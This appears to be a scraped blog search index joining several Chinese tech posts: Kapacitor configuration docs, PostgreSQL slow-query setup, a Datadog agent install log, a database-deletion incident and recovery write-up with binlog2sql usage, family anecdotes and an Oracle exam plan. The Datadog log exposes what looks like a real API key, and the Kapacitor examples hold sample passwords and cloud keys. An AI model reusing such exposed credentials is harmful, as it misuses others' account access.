in a TICKscript.A user defined function is indicated by the declaration of a new grouping table with the following identifier: [udf.functions.&lt;UDF_NAME&gt;].A UDF configuration requires a path to an executable, identified by the following properties: prog: A string indicating the path to the executable. args: An array of string arguments to be passed to the executable. timeout: A timeout monitored when waiting for communications from the executable. The UDF can also include a group of environment variables declared in a tableidentified by the string udf.functions.&lt;UDF_NAME&gt;.env. Example: Configuring a User Defined Function 12345678910111213141516171819 ... [udf]# Configuration for UDFs (User Defined Functions)[udf.functions] ... # Example python UDF. # Use in TICKscript like: # stream.pyavg() # .field(&apos;value&apos;) # .size(10) # .as(&apos;m_average&apos;) # [udf.functions.pyavg] prog = &quot;/usr/bin/python2&quot; args = [&quot;-u&quot;, &quot;./udf/agent/examples/moving_avg.py&quot;] timeout = &quot;10s&quot; [udf.functions.pyavg.env] PYTHONPATH = &quot;./udf/agent/py&quot; ... Additional examples can be found directly in the default configuration file. Input methodsKapacitor can receive and process data from sources other than InfluxDB, and the results of this processing can then be written to an InfluxDB database. Currently, the following two sources external to InfluxDB are supported: Collectd: The POSIX daemon collectd for collecting system, network and service performance data. Opentsdb: The Open Time Series Database (Opentsdb) and its daemon tsd. Configuration of connections to third party input sources requires properties such as: bind-address: Address at which Kapacitor will receive data. database: Database to which Kapacitor will write data. retention-policy: Retention policy for that database. batch-size: Number of datapoints to buffer before writing. batch-pending: Number of batches that may be pending in memory. batch-timeout: Length of time to wait before writing the batch. Ifthe batch size has not been reached, then a short batch will be written. Each input source has additional properties specific to its configuration. Theyfollow the same configurations for these services used inInfluxdb. Example: Collectd configuration 1234567891011...[collectd] enabled = false bind-address = &quot;:25826&quot; database = &quot;collectd&quot; retention-policy = &quot;&quot; batch-size = 1000 batch-pending = 5 batch-timeout = &quot;10s&quot; typesdb = &quot;/usr/share/collectd/types.db&quot;... Example 16 – Opentsdb configuration 12345678910111213...[opentsdb] enabled = false bind-address = &quot;:4242&quot; database = &quot;opentsdb&quot; retention-policy = &quot;&quot; consistency-level = &quot;one&quot; tls-enabled = false certificate = &quot;/etc/ssl/influxdb.pem&quot; batch-size = 1000 batch-pending = 5 batch-timeout = &quot;1s&quot;... User Datagram Protocol (UDP) As demonstrated in the Live Leaderboardguide and the Scoresexample, Kapacitor can be configured to accept raw data from a UDP connection. This is configured much like other input services. Example: UDP configuration 1234567...[[udp]] enabled = true bind-address = &quot;:9100&quot; database = &quot;game&quot; retention-policy = &quot;autogen&quot;... Service discovery and metric scrapingWhen the number and addresses of the hosts and services for which Kapacitorshould collect information are not known at the time of configuring or bootingthe Kapacitor service, they can be determined, and the data collected, at runtimewith the help of discovery services.This process is known as metric scraping and discovery.For more information, see Scraping and Discovery. For scraping and discovery to work one or more scrapers must be configured. Onescraper can be bound to one discovery service. Example: Scraper configuration 123456789101112131415161718192021222324...[[scraper]] enabled = false name = &quot;myscraper&quot; # Specify the id of a discoverer service specified below discoverer-id = &quot;goethe-ec2&quot; # Specify the type of discoverer service being used. discoverer-service = &quot;ec2&quot; db = &quot;prometheus_raw&quot; rp = &quot;autogen&quot; type = &quot;prometheus&quot; scheme = &quot;http&quot; metrics-path = &quot;/metrics&quot; scrape-interval = &quot;1m0s&quot; scrape-timeout = &quot;10s&quot; username = &quot;schwartz.pudel&quot; password = &quot;f4usT!1808&quot; bearer-token = &quot;&quot; ssl-ca = &quot;&quot; ssl-cert = &quot;&quot; ssl-key = &quot;&quot; ssl-server-name = &quot;&quot; insecure-skip-verify = false... The example above is illustrative only. Discovery servicesKapacitor currently supports 12 discovery services.Each of these has an id property by which it will be bound to a scraper. Configuration entries are prepared by default for the following discoveryservices: Azure Consul DNS EC2 File Discovery GCE Marathon Nerve ServerSet Static Discovery Triton UDP Example: EC2 Discovery Service configuration 1234567891011...[[ec2]] enabled = false id = &quot;goethe-ec2&quot; region = &quot;us-east-1&quot; access-key = &quot;ABCD1234EFGH5678IJKL&quot; secret-key = &quot;1nP00dl3N01rM4Su1v1Ju5qU3ch3ZM01&quot; profile = &quot;mph&quot; refresh-interval = &quot;1m0s&quot; port = 80... The above example is illustrative. Kapacitor environment variablesKapacitor can use environment variables for high-level properties or tooverride properties in the configuration file. Environment variables not in configuration fileThese variables are not found in the configuration file. KAPACITOR_OPTS: Found in the systemd startup script and used to passcommand line options to kapacitord started by systemd. KAPACITOR_CONFIG_PATH: Sets the path to the configuration file. KAPACITOR_URL: Used by the client application kapacitor to locatethe kapacitord service. KAPACITOR_UNSAFE_SSL: A Boolean used by the client application kapacitorto skip verification of the kapacitord certificate when connecting over SSL. Mapping properties to environment variablesKapacitor-specific environment variables begin with the token KAPACITORfollowed by an underscore (_).Properties then follow their path through the configuration file tree with each node in the tree separated by an underscore.Dashes in configuration file identifiers are replaced with underscores.Table groupings in table arrays are identified by integer tokens. Examples: KAPACITOR_SKIP_CONFIG_OVERRIDES: Could be used to set the value forskip-config-overrides. KAPACITOR_INFLUXDB_0_URLS_0: Could be used to set the value of thefirst URL item in the URLS array in the first Influxdb property grouping table,i.e. [infludxb][0].[urls][0]. KAPACITOR_STORAGE_BOLTDB: Could be used to set the path to the boltdbdirectory used for storage, i.e. [storage].botldb. KAPACITOR_HTTPPOST_0_HEADERS_Authorization: Could be used to set thevalue of the authorization header for the first HTTPPost configuration ([httppost][0].headers.{authorization:&quot;some_value&quot;}). KAPACITOR_KUBERNETES_ENABLED: Could be used to enable the Kubernetesconfiguration service ([kubernetes].enabled). Configuring with the HTTP APIThe Kapacitor HTTP API can also be used to overridecertain parts of the configuration.This can be useful when a property may contain security sensitive information that should not be left in plain view in the file system, or when you need to reconfigure a service without restarting Kapacitor.To view which parts of the configuration are available,pull the JSON file at the /kapacitor/v1/config endpoint.(e.g., http://localhost:9092/kapacitor/v1/config). Working with the HTTP API to override configuration properties is presented indetail in the Configuration sectionof the HTTP API document.In order for overrides over the HTTP API to work,the [config-override].enabled property must be set to true. Generally, specific sections of the configuration can be viewed as JSON files byGETting them from the context path built by their identifier from the configendpoint.For example, to get the table groupings of InfluxDB properties,use the context /kapacitor/v1/config/influxdb.Security-sensitive fields such as passwords, keys, and security tokens are redacted when using GET. Properties can be altered by POSTing a JSON document to the endpoint.The JSON document must contain a set field with a map of the properties to override andtheir new values. Example: JSON file for enabling the SMTP configuration 12345{ &quot;set&quot;:{ &quot;enabled&quot;: true }} By POSTing this document to the /kapacitor/v1/config/smtp/ endpoint, the SMTPservice can be enabled. Property overrides can be removed with the delete field in the JSON document. Example: JSON file for removing an SMTP override 12345{ &quot;delete&quot;:[ &quot;enabled&quot; ]}By POSTing this document to the /kapacitor/v1/config/smtp/ endpoint the SMTPoverride is removed and Kapacitor reverts to the behavior defined in theconfiguration file.","link":"/2020/04/14/booboo_tick/kapacitor/03_Kapacitor%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/A_Kapacitor%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B/"},{"title":"表格实现合计","text":"需求对 Flask_Admin 的 list.html 中添加 一个统计列。 技术调研 html css js bootstrap 目前比较缺的技术是js。 在完成该需求前，先学习JavaScript教程。","link":"/2020/04/18/booboo_others/2020-04-17-tec-html/"},{"title":"PostgreSQL安装pg_stat_statements模块开启慢查询统计","text":"安装pg_stat_statements模块开启慢查询统计123456789101112131415161718192021222324252627282930313233# 需要安装相同版本的contrib包yum install -y postgresql-contrib.x86_64# 修改配置文件vim /var/lib/pgsql/data/postgresql.conf# 当需要跟踪SQL语句或者慢语句，得需要设置以下参数：log_statement = all #需设置跟踪所有语句，否则只能跟踪出错信息log_min_duration_statement = 5000 #milliseconds,记录执行5秒及以上的语句shared_preload_libraries = &apos;pg_stat_statements&apos; # (change requires restart)#以下配置pg_stat_statements采样参数pg_stat_statements.max = 10000## 在pg_stat_statements中最多保留多少条统计信息，通过LRU算法，覆盖老的记录。pg_stat_statements.track = all## all - (所有SQL包括函数内嵌套的SQL), top - 直接执行的SQL(函数内的sql不被跟踪), none - (不跟踪)pg_stat_statements.track_utility = off## 是否跟踪非DML语句 (例如DDL，DCL)，on表示跟踪, off表示不跟踪pg_stat_statements.save = on# 重启服务su - postgrespg_ctl -D /var/lib/pgsql/data reload# 创建 extension# 由于pg_stat_statements针对的是数据库级别，所以需要首先进入指定数据库psql\\l\\c test01create extension pg_stat_statements;\\df 查询慢SQL12345SELECT query, calls, total_time, rows, 100.0 * shared_blks_hit / nullif(shared_blks_hit + shared_blks_read, 0) AS hit_percent FROM pg_stat_statements ORDER BY calls,total_time DESC LIMIT 5;SELECT query, calls, total_time, rows, 100.0 * shared_blks_hit / nullif(shared_blks_hit + shared_blks_read, 0) AS hit_percent FROM pg_stat_statements ORDER BY calls,total_time DESC LIMIT 5; 参考文档 postgresql 查找慢sql之二: pg_stat_statements PostgreSQL一些常用命令","link":"/2020/04/23/booboo_others/2020-04-22-tec-pg-md/"},{"title":"DataDog监控数据库（一）","text":"官网现代监测与分析 在任何堆栈，任何应用程序，任何规模，任何地方都可以查看。 datadog官网 安装centos插件script123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102[root@NB-flexgw1:/root]# DD_AGENT_MAJOR_VERSION=7 DD_API_KEY=7911dc3b1d3c1034ba563eb2d61767f5 bash install_script.sh* Installing YUM sources for Datadog* Installing the Datadog Agent package已加载插件：fastestmirrorCleaning repos: base datadog docker-ce-stable epel extras influxdb : percona-release-noarch percona-release-x86_64 updates24 metadata 文件已删除16 sqlite 文件已删除0 metadata 文件已删除已加载插件：fastestmirror设置安装进程Determining fastest mirrors解决依赖关系--&gt; 执行事务检查---&gt; Package datadog-agent.x86_64 1:7.18.1-1 will be 安装--&gt; 完成依赖关系计算依赖关系解决================================================================================ 软件包 架构 版本 仓库 大小================================================================================正在安装: datadog-agent x86_64 1:7.18.1-1 datadog 130 M事务概要================================================================================Install 1 Package(s)总下载量：130 MInstalled size: 435 M下载软件包：warning: rpmts_HdrFromFdno: Header V4 RSA/SHA1 Signature, key ID e09422b3: NOKEYRetrieving key from https://yum.datadoghq.com/DATADOG_RPM_KEY_E09422B3.publicImporting GPG key 0xE09422B3: Userid: &quot;Datadog, Inc &lt;package@datadoghq.com&gt;&quot; From : https://yum.datadoghq.com/DATADOG_RPM_KEY_E09422B3.public运行 rpm_check_debug执行事务测试事务测试成功执行事务 正在安装 : 1:datadog-agent-7.18.1-1.x86_64 1/1Enabling service datadog-agentLoading SELinux policy module for datadog-agent.Couldn’t load system-probe policy.To be able to run system-probe on your host, please install or update the selinux-policy-targeted andpolicycoreutils-python (or policycoreutils-python-utils depending on your distribution) packages.Then run the following commands, or reinstall datadog-agent: semodule -i /etc/datadog-agent/selinux/system_probe_policy.pp semanage fcontext -a -t system_probe_t /opt/datadog-agent/embedded/bin/system-probe restorecon -v /opt/datadog-agent/embedded/bin/system-probeNo datadog.yaml file detected, not starting the agent Verifying : 1:datadog-agent-7.18.1-1.x86_64 1/1已安装: datadog-agent.x86_64 1:7.18.1-1完毕！* Adding your API key to the Agent configuration: /etc/datadog-agent/datadog.yaml* Starting the Agent...stop: Unknown instance:datadog-agent start/running, process 15261Your Agent is running and functioning properly. It will continue to run in thebackground and submit metrics to Datadog.If you ever want to stop the Agent, run: stop datadog-agentAnd to run it again run: start datadog-agent[root@NB-flexgw1:/root]# pwd/etc/datadog-agent/conf.d[root@NB-flexgw1:/root]# lsactivemq.d containerd.d external_dns.d ibm_mq.d kube_scheduler.d nfsstat.d rabbitmq.d tcp_check.dactivemq_xml.d coredns.d file_handle.d ibm_was.d kyototycoon.d nginx.d redisdb.d teamcity.daerospike.d couchbase.d flink.d io.d lighttpd.d nginx_ingress_controller.d riakcs.d tenable.dairflow.d couch.d fluentd.d istio.d linkerd.d ntp.d riak.d tls.damazon_msk.d cpu.d gearmand.d jboss_wildfly.d linux_proc_extras.d openldap.d sap_hana.d tomcat.dambari.d cri.d gitlab.d jmx.d load.d openmetrics.d scylla.d twemproxy.dapache.d crio.d gitlab_runner.d kafka_consumer.d mapr.d openstack_controller.d snmp.d twistlock.dbtrfs.d directory.d go_expvar.d kafka.d mapreduce.d openstack.d solr.d uptime.dcacti.d disk.d go-metro.d kong.d marathon.d oracle.d spark.d varnish.dcassandra.d dns_check.d gunicorn.d kube_apiserver_metrics.d mcache.d pgbouncer.d sqlserver.d vault.dcassandra_nodetool.d docker.d haproxy.d kube_controller_manager.d memory.d php_fpm.d squid.d vertica.dceph.d druid.d harbor.d kube_dns.d mesos_master.d postfix.d ssh_check.d vsphere.dcilium.d ecs_fargate.d hdfs_datanode.d kubelet.d mesos_slave.d postgres.d statsd.d yarn.dcisco_aci.d eks_fargate.d hdfs_namenode.d kube_metrics_server.d mongo.d powerdns_recursor.d supervisord.d zk.dclickhouse.d elastic.d hive.d kube_proxy.d mysql.d presto.d system_core.dcockroachdb.d envoy.d http_check.d kubernetes_apiserver.d nagios.d process.d systemd.dconsul.d etcd.d ibm_db2.d kubernetes_state.d network.d prometheus.d system_swap.d[root@NB-flexgw1:/root]# 添加MySQL监控最简单配置 script123456[root@NB-flexgw1:/root]# grep -v &apos;^ #&apos; conf.yaml | grep -v &apos;^#&apos; | grep -v &apos; #&apos; |grep -v &apos;^$&apos;init_config:instances: - server: 10.200.6.53 user: xxx pass: xxx 添加pg监控123456789101112psql postgres -c \\&quot;select * from pg_stat_database LIMIT(1);&quot; \\&amp;&amp; echo -e &quot;\\e[0;32mPostgres connection - OK\\e[0m&quot; \\|| echo -e &quot;\\e[0;31mCannot connect to Postgres\\e[0m&quot;CREATE FUNCTION pg_stat_activity() RETURNS SETOF pg_catalog.pg_stat_activity AS$$ SELECT * from pg_catalog.pg_stat_activity; $$LANGUAGE sql VOLATILE SECURITY DEFINER;CREATE VIEW pg_stat_activity_dd AS SELECT * FROM pg_stat_activity();grant SELECT ON pg_stat_activity_dd to test01; datadog agent 日志12345/var/log/datadog/errors.log/var/log/datadog/trace-errors.log/var/log/datadog/trace-agent.log/var/log/datadog/process-errors.log/var/log/datadog/process-agent.log 使用感受 datadog产品聚焦于IT运维场景，且方案中拓展成不通行业的运维场景，非常地有针对性。 安装配置文档说明非常详细。 采集器丰富，且非常强大，举例（mysql采集器比telegraf官方的强大多了！！！！已经支持自定义SQL的方式，且包含对mysql错误日志、慢查询日志的集成）–用户的角度，而不是只提供插件不提供场景 默认的图表展示较一般，且全英文 告警还没有使用，先不说感受了。","link":"/2020/04/23/booboo_others/2020-04-23-tec-datadog/"},{"title":"比技术更重要的事情","text":"写在前面 不以规矩，不能成方圆 因一个好心办坏事的悲惨故事引发的思考。 `数据库从删库跑路` 经常被DBA、运维调侃。因为这个操作是致命的！ 如果你在甲方，那么能遇到删库跑路的机会还是很少的，三年遇到一次那都算多的； 但如果你在乙方，那么一个月一次都算少的。。。 在乙方，会遇到大公司，小公司，微型公司；有规范的数据库备份策略，也有压根儿就不知备份为何物的。 呼吁DBA提高自身修养，非DBA也要操作谨慎。 各种奇葩的”人为误操作”： 某新零售科技公司-自建MySQL5.7-误操作Truncate导致业务故障 某基金公司-阿里云RDS For MySQL5.7-误操作Update导致业务数据错乱 某化妆品公司-阿里云RDS For MySQL5.7-误操作Alter导致业务数据错乱 某公司-自建MySQL5.7-数据库服务器因磁盘空间异常宕机后误操作rm -rf 数据库的数据目录导致数据库无法启动 某金融公司-自建MySQL5.7-数据库服务器异常断电后数据表空间损坏（数据量2T） 各种奇葩的”备份失效” 我以为我备份了，其实备份脚本压根就没有跑 我以为我备份了，其实最近一次备份是一个月前 我以为我备份了，其实不仅没有备份，连binlog都没开，开了也没有设置row格式。 我以为我备份了，也开了binlog日志，其实binlog日志只保留1天，全备份是7天前的。 我以为我的数据不重要，没有备份，我删了，业务告诉我数据还要。 欢迎补充奇葩备份失败案例。 故事背景今天我们遇到的案例是一个好心办坏事的悲惨故事。 我们暂且称主人公叫小A吧～ 小A最近在做一个项目：阿里云金融云上将UAT环境的业务P 从深圳（华南2）迁移到 （上海）华东2。 故事的时间线淋如下： 2020年4月22日晚：业务应用已经迁移到了上海，数据库也迁移过去了，但是业务忘记切换数据库了（这里有坑）。 2020年4月23日晚7点57分：业务反馈无法访问数据库 2020年4月23日晚7点58分：运维小A反馈：”我以为业务已经切了，就将深圳的数据库实例的 业务账号和db1库和db2库 都在控制台上删除了” 2020年4月23日晚8点00分：运维同学发现：业务还连着深圳的库，压根没切到上海去。 三问小A 问：是谁发出了指令要求小A去删用户删库？ 回答： 没有人 问：没有人让你做，你为什么要做？ 回答：我以为业务已经正常迁移走了，不需要了，可以释放空间，所以就做了。 问：你知道公司的流程规范吗？ 回答：知道，但是还是做了。 故事分析故事到这里，我们先看一下问题出在哪里？ &quot;不以规矩，不能成方圆&quot; —— 孟子 1. 迁移UAT环境，以为非生产环境不需要规范化操作，因此迁移没有像生产环境那样严格按照迁移规范操作，缺少了应用迁移的预演和验证。 2. 运维同学小A，为了节约深圳的资源空间，自作主张去删用户，删库，缺少了运维规范的约束，是不知道规范？还是约束力不够？ 在企业中没有好心，只有规范和流程。 救援步骤 1. 确认误操作前的时间点 2. 阿里云控制台通过单库逻辑备份+时间点的方式恢复到新实例 3. 补事务 4. DTS或逻辑导入源实例 补事务具体步骤 一些阿里的坑 1. 解析binlog日志，确定误操作的两个时间点(先后删除了两个库) 2. 从备份恢复的时间点开始恢复日志，并跳过误操作 3. 导入测试实例，验证表行数，开发侧验证数据 1. 实例开不出来，最终选择了一台已存在的测试实例 2. 200M的数据量通过控制台恢复到指定时间点耗时较长2小时 阿里云RDS For MySQL常用恢复方法操作规范 与客户沟通故障时间 * 误操作人只能知道大致的误操作时间 * 根据大致时间过滤数据 * 根据数据量取误操作前后多长时间（默认10分钟） 与客户沟通误操作的内容 * 误操作表 * 误操作执行语句 将执行服务器ECS允许连接MySQL * 自建数据库授权 * RDS添加白名单 利用工具紧急救援 * 获取误操作SQL执行具体时间 * 获取误操作SQL执行具体位置 * 全备份恢复+解析SQL * 解析SQL+回滚SQL 操作工具 阿里云工具不得不说阿里云的正向恢复工具越来越完善，目前已支持： 全库物理备份+binlog 恢复方式：控制台-克隆实例-指定备份集/指定时间点 单库逻辑备份+binlog 恢复方式：控制台-备份恢复-单库恢复-指定备份集/指定时间点/指定恢复目标（新实例，本实例不同库名） 另外阿里还提供额外付费的DBS备份工具（逻辑备份）：单库/全库 一键恢复到指定时间点 开源工具-binlog2sql工具从MySQL binlog解析出你要的SQL。根据不同选项，你可以得到原始SQL、回滚SQL、去除主键的INSERT SQL等。","link":"/2020/04/24/booboo_others/2020-04-24-tec-rds-md/"},{"title":"开源工具-binlog2sql工具","text":"开源工具-binlog2sql工具从MySQL binlog解析出你要的SQL。根据不同选项，你可以得到原始SQL、回滚SQL、去除主键的INSERT SQL等。 用途 数据快速回滚（闪回） 主从切换后master丢数据的修复 从binlog生成标准SQL，带来的衍生功能 限制 mysql server必须开启，离线模式下不能解析 参数 binlog_row_image 必须为FULL，暂不支持MINIMAL 解析速度不如mysqlbinlog 安装1234567# centos7# python2.7git clone https://github.com/danfengcao/binlog2sql.git &amp;&amp; cd binlog2sqlyum -y install epel-releaseyum -y install python-pippip install --upgrade pippip install -r requirements.txt 对MySQL的使用限制MySQL server必须设置以下参数: 123456[mysqld]server_id = 1log_bin = /var/log/mysql/mysql-bin.logmax_binlog_size = 1Gbinlog_format = rowbinlog_row_image = full user需要的最小权限集合： 1select, super/replication client, replication slave 建议授权 1GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO binlog2sql帮助12345678910111213141516mysql连接配置-h host; -P port; -u user; -p password解析模式--stop-never 持续同步binlog。可选。不加则同步至执行命令时最新的binlog位置。-K, --no-primary-key 对INSERT语句去除主键。可选。-B, --flashback 生成回滚语句，可解析大文件，不受内存限制，每打印一千行加一句SLEEP SELECT(1)。可选。与stop-never或no-primary-key不能同时添加。解析范围控制--start-file 起始解析文件。必须。--start-position/--start-pos start-file的起始解析位置。可选。默认为start-file的起始位置。--stop-file/--end-file 末尾解析文件。可选。默认为start-file同一个文件。若解析模式为stop-never，此选项失效。--stop-position/--end-pos stop-file的末尾解析位置。可选。默认为stop-file的最末位置；若解析模式为stop-never，此选项失效。--start-datetime 从哪个时间点的binlog开始解析，格式必须为datetime，如&apos;2016-11-11 11:11:11&apos;。可选。默认不过滤。--stop-datetime 到哪个时间点的binlog停止解析，格式必须为datetime，如&apos;2016-11-11 11:11:11&apos;。可选。默认不过滤。对象过滤-d, --databases 只输出目标db的sql。可选。默认为空。-t, --tables 只输出目标tables的sql。可选。默认为空。 案例解析标准SQL1python binlog2sql.py -h127.0.0.1 -P3306 -uroot -dhjxdb -t user --start-file=&apos;mysql-bin.000001&apos; --start-datetime=&apos;2017-09-14 13:50:00&apos; --stop-datetime=&apos;2017-09-14 14:10:00&apos; 解析出回滚SQL -B: 参数代表回滚 1python binlog2sql.py -h127.0.0.1 -P3306 -uroot -dhjxdb -t user --start-file=&apos;mysql-bin.000001&apos; --start-position=4946 --stop-position=5921 -B 工具是给人用的，关键还得有思路。加油⛽️","link":"/2020/04/24/booboo_others/2020-04-24-tec-mysql/"},{"title":"Amy经典语录-第五篇","text":"在这个新冠状病毒肆虐的日子里，有孩子的陪伴，足矣 场景1小慈濾 在洗脚，洗完了喊妈妈：妈咪，我洗完了，抱我！ 丫丫妈妈（专心看美剧中）：宝贝，我这就派我的将军-严大将来抱你上床！ YY妈妈（爸爸此时正躺着玩手机）：爸爸，大将军快去抱孩子。 沉寂30秒。。。 小慈（小手环抱胸口）：妈咪，我很生气，你不是说，爸比是你的大将军吗？什么大将军，只会玩手机。不抱我！！！（生气勞） 小慈话音刚落，大将军以迅雷不及掩耳之势将宝宝从小椅子上抱起落在了床⬆上 濾 场景2識早晨上班 小慈：妈咪，你要早点回来哦 妈咪：好的宝贝，我一定早定回来 小慈：可以你昨天也说早点回来，每次都输给爸比 （我再也不相信你早点回来的的鬼话了） 场景3一天早晨半睡半醒的妈咪和宝宝不小心听到了爸比和奶奶的对话 新冠期间，爸比和妈咪每天早上会带饭到公司吃，奶奶有时会早起帮忙炒菜。 爸比：妈，下次蔬菜塞多炒一些。 奶奶：你都带过去好了 爸比：妈，你为什么不多炒一些呢？ 奶奶：就买了这么多。。。 爸比：无语 爸比：荷包蛋太少了 奶奶：你都带过去好了 爸比：那丫丫带什么 爸比生气，我不要了！！！！ 好吧，爸比太❤️妈咪了哈哈 好吃的都留给我，感动中 奶奶也没有错，她想的是爸比先带，没有了可以炒其他的蔬菜塞～ 但明显爸比更爱妈咪 ^.^","link":"/2020/04/29/amy_life/2020-04-29-amy/"},{"title":"Oracle12C OCP考试复习计划","text":"写在前面 Oracle 12c 考试认证 OCA 1Z0-071 1Z0-062 OCP OCM 考核分数概览 考点明细 刷题时间表 写在前面本定在2020年3月份的OCP考试，因疫情原因推迟到5月底。 终于到了认真计划看题的时间节点了。 看题前，先回顾一下学习Oracle 12C的时间段情况： 通过github的commit提交情况统计出每日的活跃时间 分析结果 12345678910111213141516171819202122232425$ git log --date=iso | perl -nalE &apos;if (/^Date:\\s+[\\d-]{10}\\s(\\d{2})/) { say $1+0 }&apos; | sort | uniq -c|perl -MList::Util=max -nalE &apos;$h{$F[1]} = $F[0]; }{ $m = max values %h; foreach (0..23) { $h{$_} = 0 if not exists $h{$_} } foreach (sort {$a &lt;=&gt; $b } keys %h) { say sprintf &quot;%02d - %4d %s&quot;, $_, $h{$_}, &quot;*&quot;x ($h{$_} / $m * 50); }&apos;00 - 7 *************************01 - 8 ****************************02 - 9 ********************************03 - 4 **************04 - 005 - 006 - 007 - 008 - 009 - 2 *******10 - 4 **************11 - 1 ***12 - 3 **********13 - 4 **************14 - 8 ****************************15 - 11 ***************************************16 - 11 ***************************************17 - 14 **************************************************18 - 8 ****************************19 - 13 **********************************************20 - 4 **************21 - 11 ***************************************22 - 8 ****************************23 - 4 ************** 1. 学习时间主要集中在下午，晚上和凌晨 2. 2019-09-22 22:16:54 ～ 2020-05-03 01:54:30 完成Oracle 12C OCP的所有课程学习（周末上课14天，自己看书做练习）。预计到拿证共 8个月 我的学习记录目前保存在Github中，待完成OCP考核后，会逐步完善学习记录和考题到博客中来。 考试/证书仅仅是更好得学习一门技术的方式，而不是目标；考试会让你获得这门技术的广度，日常的学习和工作的实践则收获技术的深度。 Oracle 12c 考试认证Oracle官方帮助 The Oracle Certified Associate (OCA) for Oracle Database 12c assesses fundamental concepts and skills DBAs need for daily operational management and maintenance. Building upon the competencies in the Oracle Database 12c OCA certification, the Oracle Certified Professional (OCP) for Oracle Database 12c includes the advanced knowledge and skills required of top-performing database administrators, including development and deployment of backup, recovery and Cloud computing strategies. The Oracle Certified Master (OCM) for Oracle Database 12c - a very challenging and elite top-level certification - certifies the most highly skilled and experienced database experts. Oracle Database 12c SQL 1Z0-071 考试价格： ¥1077 | 时长： 120分钟 | 及格分数： 63％ | 78题 Oracle Database 12c：SQL基础知识1Z0-061 （于2019年11月30日淘汰） Oracle简介：SQL和PL / SQL 1Z0-001 （已淘汰） Oracle9i简介：SQL 1Z0-007 （已淘汰 ） Oracle Database SQL Expert 1Z0-047 （已淘汰） Oracle数据库：SQL基础知识I 1Z0-051 （已淘汰 ） Oracle Database 12c管理1Z0-062 考试价格： ¥1077 | 时长： 120分钟 | 及格分数： 64％ | 67题 Oracle Database 12c：高级管理1Z0-063 考试价格： ¥1077 | 时长： 120分钟 | 及格分数： 60％ | 80题 Oracle Database 12c认证高级考试12cOCM 考试价格： ¥9,768 | 时长： 2 days | 及格分数： 59.95% | 80题 Oracle考试必须原厂培训或指定合作机构培训才可参加考试。 考核分数概览 认证 编号 时长 总题数 及格分数 最大错误题数 OCA 1Z0-071 2小时 78 63% 28 1Z0-062 2小时 67 64% 24 OCP 1Z0-063 2小时 80 60% 32 OCM 12cOCM 2天 80 59.95% 31 考点明细 1Z0-071考点 1Z0-062 考点 1Z0-063 考点 12cOCM 考点 刷题时间表 时间 安排 完成情况 2020-05-03 周日 071 全部刷一遍 071 50题 2020-05-04 周一 062 全部刷一遍 071 50题 2020-05-05 周二 063 50题 071 74题 062 2020-05-06 周三 063 50题 2020-05-07 周四 063 50题 2020-05-08 周五 063 50题 2020-05-09 周六 063 50题 2020-05-10 周日 063 50题 2020-05-11 周一 071 全部刷一遍 2020-05-12 周二 062 全部刷一遍 2020-05-13 周三 063 全部刷一遍 2020-05-14 周四 071 全部刷一遍 2020-05-15 周五 062 全部刷一遍 2020-05-16 周六 063 全部刷一遍 2020-05-17 周日 071、062、063 2020-05-18 周一 071 全部刷一遍 2020-05-19 周二 062 全部刷一遍 2020-05-20 周三 063 全部刷一遍 2020-05-21 周四 071 全部刷一遍 2020-05-22 周五 062 全部刷一遍 2020-05-23 周六 063 全部刷一遍 2020-05-24 周日 071、062、063 2020-05-25 周一 071、062、063 2020-05-26 周二 071、062、063 2020-05-27 周三 071、062、063 2020-05-28 周四 071、062、063 2020-05-29 周五 考试","link":"/2020/05/03/ocp/Oracle12c/2020-05-03-ocp-oracle12c/"},{"title":"Oracle12C OCP 1z0-071 178道考题解析","text":"Oracle12C OCP 1z0-071 1Z0-071认证考试题库学习资料根据最新的知识点以及辅导资料进行整编， 覆盖面广， 涵盖了众多最新的1Z0-071考试知识点。 Number: 1z0-071 Passing Score: 63 Time Limit: 120 min File Version: 1.0 1z0-071 2020-01.25 [v1.0] Oracle数据库12c SQL 1Z0-071 考试价格：¥1077 | 时长：120分钟| 及格分数：63％| 78题Exam A考点 更多Oracle学习资料可以访问GitHub仓库 1Z0-071题目概览 Exam 我的任务 数量 B Exam B 单行函数 25 C Exam C 组函数 4 D Exam D 多表连接 13 E Exam E 子查询 11 F Exam F SQLPlus和变量 4 G Exam G DML语句的使用 14 H Exam H DDL管理5大对象 40 I Exam I DCL管理用户 10 J Exam J DQL语句的使用 46 K Exam K 事务和锁机制 11 178 1Z0-071考题详解Exam A 考点解析 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 点击查看知识点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374单行函数 字符函数 数值函数 日期函数 转换函数 隐式数据类型转换 显式数据类型转换 RR和YY年份 嵌套函数 常规函数 条件表达式组函数 avg() 平均 count() 统计 max() 最大值 min() 最小值 stddev 估算标准偏差 sum 求和 variance 方差 1. groupby字句进行分组 2. having字句聚合函数过滤子查询 where 型 单行=、!=、&gt;、&lt;、&lt;=、&gt;=等 多行 in、any、all from 型 exits 型SQLPlus 和变量 替代变量 若没有事先声明一个变量，那么引用的时候: &amp;p 代表一次性声明，从键盘输入变量的值，下次还需要再次输入，define 命令不能看到 p 变量 &amp;&amp;p 代表当前会话中的声明，从键盘输入变量的值，下次就不需要再输入，define 命令能看到 p变量DML 语句的使用 insert update delete truncate with check option 选项 merge 合并行DDL管理5大对象 表&lt;用户表、视图、数据类型&gt; 视图:一张或多张表的数据子集 序列 索引 同义词DCL 管理用户 权限 系统权限 对象权限 角色 级联授权 系统权限级联授权:with admin option 权限回收无级联 对象权限级联授权:with grant option 权限回收有级联DQL 语句的使用 集合运算 扩展的时间 日期函数 增强的 Group By 高级子查询 insert 扩展 外部表 exists事务和锁机制 隐式事务 显式事务 SAVEPOINT 和 ROLLBACK TO SAVEPOINT 回退改变到标记处 COMMIT 或者 ROLLBACK 提交改变 ROLLBACK 回退改变 Exam B 单行函数 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 